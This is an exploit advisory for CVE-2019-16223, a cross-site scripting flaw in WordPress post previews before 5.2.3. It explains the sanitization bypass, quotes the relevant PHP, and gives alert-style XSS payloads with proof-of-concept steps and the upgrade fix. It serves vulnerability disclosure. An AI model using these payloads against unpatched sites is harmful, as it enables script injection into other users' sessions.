@@ -1,0 +1,68 @@
+# Exploit Title: Wordpress Core 5.2.2 - 'post previews' XSS
+# Date: 31/12/2020
+# Exploit Author: gx1  <g.per45[at]gmail.com>
+# Vulnerability Discovery: Simon Scannell
+# Vendor Homepage: https://wordpress.com/
+# Software Link: https://github.com/WordPress/WordPress
+# Version: <= 5.2.2
+# Tested on: any
+# CVE: CVE-2019-16223
+
+# References: 
+https://nvd.nist.gov/vuln/detail/CVE-2019-16223
+https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
+
+Description: 
+WordPress before 5.2.3 allows XSS in post previews by authenticated users.
+
+Technical Details and Exploitation: 
+The vulnerability is due to two condition: 
+1. wp_kses_bad_protocol_once() has an issue with URL sanitization that can be passed and can lead to cross-site scripting vulnerability:   
+
+the function sanitizes bad protocols, and applies a convertion of HTML entities to avoid bypass techniques; anyway, in vulnerable versions, it only checks for html entities after two points, as it is possible to 
+observe by the applied fix: 
+
+============================================================================================================================================
+function wp_kses_bad_protocol_once( $string, $allowed_protocols, $count = 1 ) {
++	$string  = preg_replace( '/(&#0*58(?![;0-9])|&#x0*3a(?![;a-f0-9]))/i', '$1;', $string );   # APPLIED FIX AFTER VULNERABILITY DETECTION 
+	$string2 = preg_split( '/:|&#0*58;|&#x0*3a;/i', $string, 2 );
+	if ( isset( $string2[1] ) && ! preg_match( '%/\?%', $string2[0] ) ) {
+
+============================================================================================================================================ 
+This allows an attacker to inject attack strings such as:    
+
+============================================================================================================================================
+<a href="javascript&#58alert(document.domain)">Example Attack</a>
+============================================================================================================================================
+Anyway, Wordpress protects against this attack because it converts any type of html entities during the rendering of posts. In a particular case, during preview, it is possible to inject html entities in a URL. That is the second condition. 
+
+2. During preview, get_the_content() function in post-template.php replaces URL encoded characters with a corresponding HTML entity: 
+
+============================================================================================================================================
+function get_the_content( $more_link_text = null, $strip_teaser = false ) {
+
+    ...
+    if ( $preview ) // Preview fix for JavaScript bug with foreign languages.
+        $output =   preg_replace_callback( '/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output );
+
+    return $output;
+}
+
+function _convert_urlencoded_to_entities( $match ) {
+    return '&#' . base_convert( $match[1], 16, 10 ) . ';';
+}
+
+============================================================================================================================================
+For this reason, it is possible to send URL encoded strings that will be converted in HTML entities during preview. HTML entities can be crafted to bypass wp_ses_bad_protocol_once() function due to issue described in condition 1. 
+
+Proof Of Concept:  
+1. Create a new post
+2. Insert in code editor the following HTML PoC code:   
+
+<a href="javascript%u003Aalert(/XSS/)">poc</a>
+
+3. Click on preview and click the "poc" link   
+
+Solution: 
+
+Upgrade Wordpress to version >= 5.2.3
